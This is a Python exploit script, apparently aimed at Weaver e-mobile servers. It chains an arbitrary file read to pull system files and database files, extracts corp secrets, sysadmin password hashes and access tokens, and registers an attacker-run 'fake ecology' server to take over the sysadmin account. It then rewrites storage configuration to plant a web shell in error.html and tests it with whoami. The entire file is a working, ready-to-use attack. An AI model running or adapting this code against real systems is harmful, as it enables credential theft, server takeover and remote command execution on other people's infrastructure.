import base64
import os
import random
import re
import secrets
import string
import sys
import time
import uuid
import requests
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
install_path="C:\\weaver\\emp\\"
install_pathlist = ["C:\\weaver\\emp\\","D:\\weaver\\emp\\","C:\\emp\\","D:\\emp\\","E:\\emp\\","F:\\emp\\","G:\\emp\\","E:\\weaver\\emp\\",
"F:\\weaver\\emp\\","G:\\weaver\\emp\\"]
# proxies = {
#          "http": "http://127.0.0.1:8080",
#          "https": "http://127.0.0.1:8080"
#     }
proxies={}

def generate_random_string(length=8):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(secrets.choice(characters) for _ in range(length))
    return random_string


def encrypt_with_public_key(public_key, plaintext):
    key = f"-----BEGIN PUBLIC KEY-----\n{public_key}\n-----END PUBLIC KEY-----"
    rsakey = RSA.importKey(key)
    cipher = Cipher_pkcs1_v1_5.new(rsakey)
    cipher_text = base64.b64encode(cipher.encrypt(plaintext.encode(encoding="utf-8")))
    value = cipher_text.decode('utf8')
    return value


def get_rsa_encoded(*args):
    uid = str(uuid.uuid4())
    rsa_pub = requests.get(url + "/emp/passport/securitysetting/get?loginUUID=" + uid, proxies=proxies,verify=False).json()[
        "publicKey"]
    processed_args = [uid]
    for arg in args:
        processed_args.append(encrypt_with_public_key(rsa_pub, arg))
    return tuple(processed_args)


def download_file(filepath):
    tmp_name = str(time.time()) + "_" + os.path.basename(filepath)
    r = requests.get(url + "/client/cdnfile/C/" + filepath, headers=headers, proxies=proxies, verify=False)
    #print(url + "/client/cdnfile/C/" + filepath)
    #print(r.status_code)
    if r.status_code == 200:
        with open(tmp_name, "wb") as fp:
            fp.write(r.content)
            print(f"[+] download file success! filepath: {filepath}   save_name: {tmp_name}")
    else:
        print(f"[!] download file failed! filepath: {filepath}")
        sys.exit(-1)
    return tmp_name


def exploit_integrated_ecology(corpid, corpsecret):
    print(f"[*] try to get access token")
    access_token = \
        requests.get(url + f"/emp/api/gettoken?corpid={corpid}&corpsecret={corpsecret}", proxies=proxies, verify=False).json()[
            "access_token"]
    print(f"[+] low permission access_token: f{access_token}")
    headers["emaccesstk"] = access_token
    print(f"[*] try creating an external integrated ecology")
    info_list = requests.get(url + "/emp/api/integrate/ec/list", headers=headers, proxies=proxies, verify=False).json()["infolist"]
    fake_ecology_id = ""
    for info in info_list:
        if info['sys_url'] == ecology_url:
            fake_ecology_id = info['id']
            break
    if fake_ecology_id:
        print(f"[*] 集成系统url已存在接入信息: {fake_ecology_id}")
    else:
        (uid, enc_pwd) = get_rsa_encoded(generate_random_string())
        sys_name = generate_random_string()
        resp = requests.post(url + "/emp/api/integrate/ec/create",
                             json={"sys_name": sys_name,
                                   "sys_url": ecology_url,
                                   "sys_url_open": "",
                                   "sys_url_pc": "",
                                   "loginid": "sysadmin",
                                   "password": enc_pwd,
                                   "sys_accesstoken": str(uuid.uuid4()),
                                   "remark": "",
                                   "auth_type": 3,
                                   "auth_userid_field": -1,
                                   "loginUUID": uid,
                                   "listSysUrlMappingVo": []
                                   }, headers=headers, proxies=proxies, verify=False).json()
        if not resp.get("errcode"):
            print(f"[+] creating external integrated ecology success , external integrated ecology url: {ecology_url}")
        else:
            print(f"[!] creating external integrated ecology failed. errmsg: {resp.get('errmsg')}")
            sys.exit(-1)
        info_list = requests.get(url + "/emp/api/integrate/ec/list", headers=headers, proxies=proxies, verify=False).json()["infolist"]
        fake_ecology_id = ""
        for info in info_list:
            if info['sys_name'] == sys_name:
                fake_ecology_id = info['id']
                break
        print(f"[+] fake ecology id: {fake_ecology_id}")

    print(f"[*] try to add right")
    burp0_json = {"right_base_type": 2, "right_name": "xxxxxx", "rightlist": [
        {"deptlist": [], "excludelist": [], "field": "", "is_own_manage": [], "is_own_part": 0, "is_own_seclevel": 0,
         "is_own_user": 0, "isall": 0, "partylist": ["1"], "permit_type": 1, "right_type": 1, "taglist": [],
         "userlist": []},
        {"deptlist": [], "excludelist": [], "field": "1", "is_own_manage": [], "is_own_part": 0, "is_own_seclevel": 0,
         "is_own_user": 0, "isall": 0, "partylist": ["1"], "permit_type": 1, "right_type": 1, "taglist": [],
         "userlist": []},
        {"deptlist": [], "excludelist": [], "field": "", "is_own_manage": [], "is_own_part": "", "is_own_seclevel": "",
         "is_own_user": "", "isall": 0, "partylist": [1], "permit_type": 1, "right_type": 0, "taglist": [],
         "userlist": []},
        {"deptlist": [], "excludelist": [], "field": "1", "is_own_manage": [], "is_own_part": 0, "is_own_seclevel": 0,
         "is_own_user": 0, "isall": 0, "partylist": ["1"], "permit_type": 1, "right_type": 4, "taglist": [],
         "userlist": []}]}
    resp = requests.post(url + "/emp/api/hrmright/add", headers=headers, json=burp0_json, proxies=proxies, verify=False).json()
    if not resp.get("errcode"):
        print(f"[+] add right success")

    sess = requests.session()
    burp0_json = {"ec_auth_code": "xxxx", "ec_id": fake_ecology_id}
    print(f"[*] try to eclogin get sysadmin access token")
    resp = sess.post(url + "/emp/passport/eclogin", json=burp0_json, proxies=proxies, verify=False).json()
    sysadmin_token = resp.get("access_token")
    if sysadmin_token:
        print(f"[+] get sysadmin access token success! token: {sysadmin_token}")

    headers["emaccesstk"] = sysadmin_token
    sys_info = sess.get(url + "/emp/admin/sysinfo/get", headers=headers,verify=False,proxies=proxies).json()["emSystemInfo"]
    root_path = sys_info["rootPath"].replace("\\", "/").replace("//", "/")
    os_type = sys_info["osName"]
    print(f"[+] tomcat root path: {root_path}")
    print(f"[+] os system: {os_type}")
    media_id = str(random.randint(100000000, 500000000))
    if "win" not in os_type:
        print(f"[*] try to mkdir {root_path + '/' + media_id} folder")

        print(f"[*] set fileLocaleStorePath value {root_path + '/' + media_id}")
        config_list = sess.get(url + "/emp/api/config/list?pagenum=1&pagesize=1000&data_type=1", headers=headers,
                               proxies=proxies, verify=False).json()[
            "configlist"]
        file_local_id = ""
        for info in config_list:
            if info['data_tag'] == "emobile.fileLocaleStorePath":
                file_local_id = info['id']
                break
        if not file_local_id:
            print(f"[*] emobile.fileLocaleStorePath 配置不存在")
            resp = sess.post(url + "/emp/api/config/set",
                             json={"data_name": "ecid", "data_tag": "emobile.fileLocaleStorePath",
                                   "data_value": root_path + "/" + media_id,
                                   "data_remark": "", "data_type": 1}, headers=headers, proxies=proxies, verify=False).json()
        else:
            print(f"[*] emobile.fileLocaleStorePath 配置存在  ID: {file_local_id}")
            resp = sess.post(url + "/emp/api/config/set",
                             json={"data_name": "ecid", "data_tag": "emobile.fileLocaleStorePath",
                                   "data_value": root_path + "/" + media_id,
                                   "data_remark": "", "data_type": 1, "id": file_local_id}, headers=headers,
                             proxies=proxies, verify=False).json()
        if not resp.get("errcode"):
            print(f"[+] set/update fileLocaleStorePath value success")
        else:
            print(f"[x] set/update fileLocaleStorePath value. errmsg: {resp.get('errmsg')}")
            sys.exit(-1)
        print(f"[*] by dowmload file to create {root_path + '/' + media_id} folder")

        media_id_tmp = str(random.randint(500000000, 900000000))
        sess.get(url + f"/emp/api/media/get?media_id={media_id_tmp}", headers=headers, proxies=proxies, verify=False)

    config_list = sess.get(url + "/emp/api/config/list?pagenum=1&pagesize=1000&data_type=1", headers=headers,
                           proxies=proxies, verify=False).json()["configlist"]
    file_local_id = ""
    for info in config_list:
        if info['data_tag'] == "emobile.fileLocaleStorePath":
            file_local_id = info['id']
            break

    print(f"[*] update emobile.fileLocaleStorePath as {root_path} ID: {file_local_id}")
    resp = sess.post(url + "/emp/api/config/set",
                     json={"data_name": "ecid", "data_tag": "emobile.fileLocaleStorePath",
                           "data_value": root_path,
                           "data_remark": "", "data_type": 1, "id": file_local_id}, headers=headers,
                     proxies=proxies, verify=False).json()
    if not resp.get("errcode"):
        print(f"[+] set/update fileLocaleStorePath value success")
    else:
        print(f"[x] set/update fileLocaleStorePath value. errmsg: {resp.get('errmsg')}")
        sys.exit(-1)

    print(f"[*] set todoc ecid value")
    config_list = \
        sess.get(url + "/emp/api/config/list?pagenum=1&pagesize=1000&data_type=1", headers=headers,
                 proxies=proxies, verify=False).json()[
            "configlist"]
    todoc_ecid = ""
    for info in config_list:
        if info['data_tag'] == "emobile.ec.todoc.ecid":
            todoc_ecid = info['id']
            break
    if not todoc_ecid:
        print(f"[*] emobile.ec.todoc.ecid 配置不存在")
        resp = sess.post(url + "/emp/api/config/set",
                         json={"data_name": "ecid", "data_tag": "emobile.ec.todoc.ecid", "data_value": fake_ecology_id,
                               "data_remark": "", "data_type": 1}, headers=headers, proxies=proxies, verify=False).json()
    else:
        print(f"[*] emobile.ec.todoc.ecid 配置存在  ID: {todoc_ecid}")
        resp = sess.post(url + "/emp/api/config/set",
                         json={"data_name": "ecid", "data_tag": "emobile.ec.todoc.ecid", "data_value": fake_ecology_id,
                               "data_remark": "", "data_type": 1, "id": todoc_ecid}, proxies=proxies, verify=False).json()
    if not resp.get("errcode"):
        print(f"[+] set/update todoc ecid value success")
    else:
        print(f"[!] set/update todoc ecid value. errmsg: {resp.get('errmsg')}")
        sys.exit(-1)

    print(f"[*] try write template into /page/client/common/error.html")
    sess.get(url + f"/emp/api/media/get?media_id={media_id}", headers=headers, proxies=proxies, verify=False)
    print(f"[*] delete ecology integrated system: {fake_ecology_id}")
    r = requests.get(url + f"/emp/api/integrate/ec/delete?id={fake_ecology_id}", headers=headers, proxies=proxies, verify=False).json()
    if not r.get("errcode"):
        print(f"[+] delete ecology integrated system success")
    else:
        print(f"[!] delete ecology integrated system error. errmsg: {r.get('errmsg')}")
    resp = sess.get(url + "/client/common/error?a=whoami", proxies=proxies, verify=False)
    if resp.status_code == 200:
        print(f"[+] write template success! shell url: {url + '/client/common/error?a=whoami'}")
        #print(re.search(r'<cmd>([\s\S]*?)</cmd>', resp.text).group(1))
        sys.exit(-1)


def exploit_sysadmin_token(sysadmin_token):
    headers["emaccesstk"] = sysadmin_token
    print(f"[*] try creating an external integrated ecology")
    info_list = requests.get(url + "/emp/api/integrate/ec/list", headers=headers, proxies=proxies, verify=False).json()["infolist"]
    fake_ecology_id = ""
    for info in info_list:
        if info['sys_url'] == ecology_url:
            fake_ecology_id = info['id']
            break
    if fake_ecology_id:
        print(f"[*] 集成系统url已存在接入信息: {fake_ecology_id}")
    else:
        (uid, enc_pwd) = get_rsa_encoded(generate_random_string())
        sys_name = generate_random_string()
        resp = requests.post(url + "/emp/api/integrate/ec/create",
                             json={"sys_name": sys_name,
                                   "sys_url": ecology_url,
                                   "sys_url_open": "",
                                   "sys_url_pc": "",
                                   "loginid": "sysadmin",
                                   "password": enc_pwd,
                                   "sys_accesstoken": str(uuid.uuid4()),
                                   "remark": "",
                                   "auth_type": 3,
                                   "auth_userid_field": -1,
                                   "loginUUID": uid,
                                   "listSysUrlMappingVo": []
                                   }, headers=headers, proxies=proxies, verify=False).json()
        if not resp.get("errcode"):
            print(f"[+] creating external integrated ecology success , external integrated ecology url: {ecology_url}")
        else:
            print(f"[!] creating external integrated ecology failed. errmsg: {resp.get('errmsg')}")
            sys.exit(-1)
        info_list = requests.get(url + "/emp/api/integrate/ec/list", headers=headers, proxies=proxies, verify=False).json()["infolist"]
        fake_ecology_id = ""
        for info in info_list:
            if info['sys_name'] == sys_name:
                fake_ecology_id = info['id']
                break
        print(f"[+] fake ecology id: {fake_ecology_id}")


    sys_info = requests.get(url + "/emp/admin/sysinfo/get", headers=headers, proxies=proxies, verify=False).json()[
        "emSystemInfo"]
    root_path = sys_info["rootPath"].replace("\\", "/").replace("//", "/")
    os_type = sys_info["osName"]
    print(f"[+] tomcat root path: {root_path}")
    print(f"[+] os system: {os_type}")
    media_id = str(random.randint(100000000, 500000000))
    file_local_id = ""
    if "win" not in os_type:
        print(f"[*] try to mkdir {root_path + '/' + media_id} folder")

        print(f"[*] set fileLocaleStorePath value {root_path + '/' + media_id}")
        config_list = requests.get(url + "/emp/api/config/list?pagenum=1&pagesize=1000&data_type=1", headers=headers,
                                   proxies=proxies, verify=False).json()[
            "configlist"]
        for info in config_list:
            if info['data_tag'] == "emobile.fileLocaleStorePath":
                file_local_id = info['id']
                break
        if not file_local_id:
            print(f"[*] emobile.fileLocaleStorePath 配置不存在")
            resp = requests.post(url + "/emp/api/config/set",
                                 json={"data_name": "ecid", "data_tag": "emobile.fileLocaleStorePath",
                                       "data_value": root_path + "/" + media_id,
                                       "data_remark": "", "data_type": 1}, headers=headers, proxies=proxies, verify=False).json()
        else:
            print(f"[*] emobile.fileLocaleStorePath 配置存在  ID: {file_local_id}")
            resp = requests.post(url + "/emp/api/config/set",
                                 json={"data_name": "ecid", "data_tag": "emobile.fileLocaleStorePath",
                                       "data_value": root_path + "/" + media_id,
                                       "data_remark": "", "data_type": 1, "id": file_local_id}, headers=headers,
                                 proxies=proxies, verify=False).json()
        if not resp.get("errcode"):
            print(f"[+] set/update fileLocaleStorePath value success")
        else:
            print(f"[x] set/update fileLocaleStorePath value. errmsg: {resp.get('errmsg')}")
            sys.exit(-1)
        print(f"[*] by dowmload file to create {root_path + '/' + media_id} folder")

        media_id_tmp = str(random.randint(500000000, 900000000))
        requests.get(url + f"/emp/api/media/get?media_id={media_id_tmp}", headers=headers, proxies=proxies, verify=False)

    config_list = requests.get(url + "/emp/api/config/list?pagenum=1&pagesize=1000&data_type=1", headers=headers,
                               proxies=proxies, verify=False).json()["configlist"]
    file_local_id = ""
    for info in config_list:
        if info['data_tag'] == "emobile.fileLocaleStorePath":
            file_local_id = info['id']
            break

    print(f"[*] update emobile.fileLocaleStorePath as {root_path} ID: {file_local_id}")
    resp = requests.post(url + "/emp/api/config/set",
                         json={"data_name": "ecid", "data_tag": "emobile.fileLocaleStorePath",
                               "data_value": root_path,
                               "data_remark": "", "data_type": 1, "id": file_local_id}, headers=headers,
                         proxies=proxies, verify=False).json()
    if not resp.get("errcode"):
        print(f"[+] set/update fileLocaleStorePath value success")
    else:
        print(f"[x] set/update fileLocaleStorePath value. errmsg: {resp.get('errmsg')}")
        sys.exit(-1)

    print(f"[*] set todoc ecid value")
    config_list = requests.get(url + "/emp/api/config/list?pagenum=1&pagesize=1000&data_type=1", headers=headers,
                               proxies=proxies, verify=False).json()[
        "configlist"]
    todoc_ecid = ""
    for info in config_list:
        if info['data_tag'] == "emobile.ec.todoc.ecid":
            todoc_ecid = info['id']
            break
    if not todoc_ecid:
        print(f"[*] emobile.ec.todoc.ecid 配置不存在")
        resp = requests.post(url + "/emp/api/config/set",
                             json={"data_name": "ecid", "data_tag": "emobile.ec.todoc.ecid",
                                   "data_value": fake_ecology_id,
                                   "data_remark": "", "data_type": 1}, headers=headers, proxies=proxies, verify=False).json()
    else:
        print(f"[*] emobile.ec.todoc.ecid 配置存在  ID: {todoc_ecid}")
        resp = requests.post(url + "/emp/api/config/set",
                             json={"data_name": "ecid", "data_tag": "emobile.ec.todoc.ecid",
                                   "data_value": fake_ecology_id,
                                   "data_remark": "", "data_type": 1, "id": todoc_ecid}, headers=headers,
                             proxies=proxies, verify=False).json()
    if not resp.get("errcode"):
        print(f"[+] set/update todoc ecid value success")
    else:
        print(f"[x] set/update todoc ecid value. errmsg: {resp.get('errmsg')}")
        sys.exit(-1)

    print(f"[*] try write template into /page/client/common/error.html")
    requests.get(url + f"/emp/api/media/get?media_id={media_id}", headers=headers, proxies=proxies, verify=False)

    r = requests.get(url + f"/emp/api/integrate/ec/delete?id={fake_ecology_id}", headers=headers, proxies=proxies, verify=False).json()
    if not r.get("errcode"):
        print(f"[+] delete ecology integrated system success")
    else:
        print(f"[!] delete ecology integrated system error. errmsg: {r.get('errmsg')}")

    resp = requests.get(url + "/client/common/error?a=whoami", proxies=proxies, verify=False)
    if resp.status_code == 200:
        print(f"[+] write template success! shell url: {url + '/client/common/error?a=whoami'}")
        print(re.search(r'<cmd>([\s\S]*?)</cmd>', resp.text).group(1))
        sys.exit(-1)


def check_sysadmin_token(token):
    sys_info = requests.get(url + "/emp/admin/sysinfo/get", headers={"emaccesstk": token, "User-Agent": UA},
                            proxies=proxies, verify=False).json()
    if sys_info.get("emSystemInfo"):
        return True
    return False


def get_sysadmin_tokens(sys_baseuser_token_idb):
    baseuser_token_idb = open(sys_baseuser_token_idb, "rb").read().decode("utf-8", "ignore")
    matchs = re.findall(r'([a-z0-9]{32})', baseuser_token_idb)
    tokens_tmp = []
    if matchs:
        for match in matchs:
            tokens_tmp.append(match)
            print(f"[*] find possibly available token: {match}")
    if len(tokens_tmp) > 0:
        tokens_tmp = tokens_tmp[::-1]
    return tokens_tmp


def get_corp_info(sys_base_user_idb):
    base_user_ibd = open(sys_base_user_idb, "rb").read().decode("utf-8", "ignore")
    matchs = re.findall(r'([a-z0-9]{34})([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})', base_user_ibd)
    corp_info = []
    if matchs:
        for match in matchs:
            print(f"[*] find integrated ecology corpid: {match[0]} corpsecret: {match[1]}")
            corp_info.append({"corpid": match[0], "corpsecret": match[1]})
    return corp_info


def get_sysadmin_info(sys_base_user_idb):
    base_user_ibd = open(sys_base_user_idb, "rb").read().decode("utf-8", "ignore")
    match = re.search(r'sysadmin([a-z0-9]{64})(\w{20})', base_user_ibd)
    if match:
        print(f"[*] find sysadmin password hash: {match.group(1)} salt: {match.group(2)}")


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
    description='poc example: python poc.py -u http://a.com -f http://vps:88  (upload 404.html and fake_ecology.py to vps and python fake_ecology.py in your vps)'
    )

    

    #parser = argparse.ArgumentParser(description="VPS(upload 404.html and fake_ecology.py):python fake_ecology.py"+"\n\n"+"poc example: python poc.py -u http://a.com -f http://vps")
    parser.add_argument('-u', type=str, required=True, help='目标url，只要/前面的，别多输')
    parser.add_argument('-f', type=str, required=True, help='自己搭建的恶意地址,只要/前面的，别多输')

    args = parser.parse_args()


    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36"
    headers = {
        "User-Agent": UA,
        "Connection": "close"
    }

    # 目标
    url = args.u
    # 恶意的ecology地址
    ecology_url = args.f

                    

    r = requests.get(url + "/client/cdnfile/C/proc/self/cmdline",headers=headers, verify=False,proxies=proxies)
    if "org.apache.catalina.startup.Bootstrap" in r.text:
        print(f"[+] OS type: linux")
        install_path = os.path.join(r.text.split("\x00")[0].split("appsvr")[0])
        print(f"[+] install path: {install_path}")
    if not install_path:
        #print(1)
        r = requests.get(url + "/client/cdnfile/C/windows/win.ini", headers=headers, proxies=proxies, verify=False)
        if "bit app support" in r.text:
            print(f"[+] OS type: Windows")
            print(f"[*] Please specify the installation path manually")
            sys.exit(-1)
    else:
        #print(2)
        for i in install_pathlist:
            url123= url+"/client/cdnfile/C/"+i+"data/mysqldata/emp_app/em_sys_base_user.ibd"
            tal=requests.get(url=url123.replace("\\", "/"),verify=False)
            # print(url123)
            # print(tal.text)
            if 'errcode' in tal.text and "errmsg" in tal.text:
                print("[-] test {} fail.  Linux system doesn't need to worry about this information".format(i))
                #print(tal.text)
                pass
            else:
                install_path=i
                #print(install_path)
                print("[+] test {} success".format(install_path))
                break

    users_db = os.path.join(install_path + "data/mysqldata/emp_app/em_sys_base_user.ibd").replace("\\", "/")
    tokens_db = os.path.join(install_path + "data/mysqldata/emp_app/em_sys_baseuser_token.ibd").replace("\\", "/")
    sys_base_user_idb = download_file(users_db)
    sys_baseuser_token_idb = download_file(tokens_db)
    corp_info = get_corp_info(sys_base_user_idb)
    if len(corp_info) == 0:
        print("[!] Ecology integration is not enabled")
        get_sysadmin_info(sys_base_user_idb)
        tokens = get_sysadmin_tokens(sys_baseuser_token_idb)
        for token in tokens:
            #print(1211111111)            
            if check_sysadmin_token(token):
                print(f"[+] Found available sysadmin token: {token}")
                exploit_sysadmin_token(token)
            else:
                print(f"[!] sysadmin token: {token} not available ")
    else:
        #print(111111111)
        for corp in corp_info:
            corpid = corp["corpid"]
            corpsecret = corp["corpsecret"]
            print(f"[*] try corpid: {corpid}  corpsecret: {corpsecret}")
            exploit_integrated_ecology(corpid, corpsecret)
